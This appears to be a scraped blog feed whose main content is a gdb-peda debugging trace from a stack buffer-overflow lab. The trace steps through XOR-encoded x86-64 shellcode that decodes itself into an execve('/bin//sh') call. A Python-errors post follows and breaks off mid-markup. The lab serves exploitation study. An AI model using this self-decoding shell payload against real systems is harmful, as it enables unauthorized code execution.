class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  sbb    eax,0xb450bf1<br>   0x00007fffffffde5c:  sub    eax,ebp<br>   0x00007fffffffde5e:  (bad)  <br>   0x00007fffffffde5f:  cmp    eax,0x3677bd49<br>   0x00007fffffffde64:  sbb    BYTE PTR [rbp+0x7c723ff8],dl<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde30 --&gt; 0xfffde98148c93148 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x3 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>   0x7fffffffde66:      clc<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x3 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>   0x7fffffffde66:      clc    <br>   0x7fffffffde67:      (bad)<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4b --&gt; 0xfff82d4827583148 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde33:      sub    rcx,0xfffffffffffffffd<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>=&gt; 0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x493d732f6e69622f<br>   0x7fffffffde61:      mov    ebp,0x95183677<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4b in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  movabs rax,0x493d732f6e69622f<br>   0x00007fffffffde61:  mov    ebp,0x95183677<br>   0x00007fffffffde66:  clc    <br>   0x00007fffffffde67:  (bad)  <br>   0x00007fffffffde68:  jb     0x7fffffffdee6<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde38 --&gt; 0xffffef058d48ffff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x2 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4b --&gt; 0xfff82d4827583148 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde33:      sub    rcx,0xfffffffffffffffd<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>=&gt; 0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4b in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>=&gt; 0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>   0x00007fffffffde57:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde61:  cdq    <br>   0x00007fffffffde62:  push   rax<br>   0x00007fffffffde63:  push   rsp<br>   0x00007fffffffde64:  pop    rdi<br>   0x00007fffffffde65:  push   rdx<br>   0x00007fffffffde66:  pop    rsi<br>   0x00007fffffffde67:  (bad)  <br>   0x00007fffffffde68:  jb     0x7fffffffdee6<br>   0x00007fffffffde6a:  sub    BYTE PTR [rdi+0x47],ah<br>   0x00007fffffffde6d:  (bad)  <br>   0x00007fffffffde6e:  cmps   BYTE PTR ds:[rsi],BYTE PTR es:[rdi]<br>   0x00007fffffffde6f:  nop<br>End of assembler dump.<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde40 --&gt; 0x6227244955bb48ff <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde4f --&gt; 0xf4e2fffffff82d48 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde3a:      lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>=&gt; 0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde4f in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde48 --&gt; 0x4827583148a6c747 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x1 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde55 --&gt; 0x6e69622fb848f4e2 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde41:      movabs rbx,0xa6c7476227244955<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>=&gt; 0x7fffffffde55:      loop   0x7fffffffde4b<br>   0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde55 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> ni</span><br>[----------------------------------registers-----------------------------------]<br>RAX: 0x7fffffffde48 --&gt; 0x4827583148a6c747 <br>RBX: 0xa6c7476227244955 <br>RCX: 0x0 <br>RDX: 0x0 <br>RSI: 0x4052a0 --&gt; 0xa21656e6f44 (&#x27;Done!\n&#x27;)<br>RDI: 0x7ffff7fa8670 --&gt; 0x0 <br>RBP: 0x9090909090909090 <br>RSP: 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x7fffffffde57 --&gt; 0x732f6e69622fb848 <br>R8 : 0x6 <br>R9 : 0x7ffff7fa5c00 --&gt; 0x4056a0 --&gt; 0x0 <br>R10: 0x5d (&#x27;]&#x27;)<br>R11: 0x246 <br>R12: 0x401050 (&lt;_start&gt;:        xor    ebp,ebp)<br>R13: 0x0 <br>R14: 0x0 <br>R15: 0x0<br>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x7fffffffde4b:      xor    QWORD PTR [rax+0x27],rbx<br>   0x7fffffffde4f:      sub    rax,0xfffffffffffffff8<br>   0x7fffffffde55:      loop   0x7fffffffde4b<br>=&gt; 0x7fffffffde57:      movabs rax,0x68732f6e69622f<br>   0x7fffffffde61:      cdq    <br>   0x7fffffffde62:      push   rax<br>   0x7fffffffde63:      push   rsp<br>   0x7fffffffde64:      pop    rdi<br>[------------------------------------stack-------------------------------------]<br>0000| 0x7fffffffdeb0 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e1 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>0008| 0x7fffffffdeb8 --&gt; 0x2f7fca000 <br>0016| 0x7fffffffdec0 --&gt; 0x401136 (&lt;main&gt;:      push   rbp)<br>0024| 0x7fffffffdec8 --&gt; 0x7fffffffe2c9 --&gt; 0x90b5e2d6fdf7c637 <br>0032| 0x7fffffffded0 --&gt; 0x401180 (&lt;__libc_csu_init&gt;:   push   r15)<br>0040| 0x7fffffffded8 --&gt; 0x16f43a298c00653d <br>0048| 0x7fffffffdee0 --&gt; 0x401050 (&lt;_start&gt;:    xor    ebp,ebp)<br>0056| 0x7fffffffdee8 --&gt; 0x0 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x00007fffffffde57 in ?? ()<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> disass 0x7fffffffde30,0x7fffffffde70</span><br>Dump of assembler code from 0x7fffffffde30 to 0x7fffffffde70:<br>   0x00007fffffffde30:  xor    rcx,rcx<br>   0x00007fffffffde33:  sub    rcx,0xfffffffffffffffd<br>   0x00007fffffffde3a:  lea    rax,[rip+0xffffffffffffffef]        # 0x7fffffffde30<br>   0x00007fffffffde41:  movabs rbx,0xa6c7476227244955<br>   0x00007fffffffde4b:  xor    QWORD PTR [rax+0x27],rbx<br>   0x00007fffffffde4f:  sub    rax,0xfffffffffffffff8<br>   0x00007fffffffde55:  loop   0x7fffffffde4b<br>=&gt; 0x00007fffffffde57:  movabs rax,0x68732f6e69622f<br>   0x00007fffffffde61:  cdq    <br>   0x00007fffffffde62:  push   rax<br>   0x00007fffffffde63:  push   rsp<br>   0x00007fffffffde64:  pop    rdi<br>   0x00007fffffffde65:  push   rdx<br>   0x00007fffffffde66:  pop    rsi<br>   0x00007fffffffde67:  push   0x3b<br>   0x00007fffffffde69:  pop    rax<br>   0x00007fffffffde6a:  syscall <br>   0x00007fffffffde6c:  add    BYTE PTR [rax],al<br>   0x00007fffffffde6e:  add    BYTE PTR [rax-0x6f6f6f70],dl<br>End of assembler dump.<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Pwn</tag>
      
      <tag>Buffer Overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python常见报错</title>
    <link href="/2022/07/04/Code/Python/python%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/"/>
    <url>/2022/07/04/Code/Python/python%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<h1 id="Python常见报错"><a href="#Python常见报错" class="headerlink" title="Python常见报错"></a>Python常见报错</h1><h2 id="1、import"><a href="#1、import" class="headerlink" title="1、import"></a>1、import</h2><blockquote><p><a href="https://blog.csdn.net/qq_19623861/article/details/118196646">https://blog.csdn.net/qq_19623861/article/details/118196646</a></p></blockquote><p>1、脚本名称与引用包重名（nmap），修改脚本文件名即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 nmap.py</span>  <br>Traceback (most recent call last):<br>  File &quot;/home/kali/PT_Python/nmap.py&quot;, line 1, in &lt;module&gt;<br>    import nmap<br>  File &quot;/home/kali/PT_Python/nmap.py&quot;, line 6, in &lt;module&gt;<br>    nm = nmap.PortScanner()<br>AttributeError: partially initialized module &#x27;nmap&#x27; has no attribute &#x27;PortScanner&#x27; (most likely due to a circular import)<br></code></pre></td></tr></table></figure><p>2、root 权限安装包：</p><figure class="highlight shell"><table><tr><td 